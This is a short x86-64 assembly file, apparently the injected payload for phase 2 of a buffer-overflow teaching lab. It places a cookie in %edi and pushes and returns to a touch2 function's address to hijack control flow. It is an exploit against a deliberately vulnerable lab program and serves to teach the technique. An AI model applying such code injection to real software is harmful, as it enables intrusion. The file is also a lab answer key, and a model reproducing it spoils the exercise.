# phrase2.s
movl $0x2c0de9c4, %edi # 传递cookie
pushq $0x0000000000401842 # 将touch2地址压栈
ret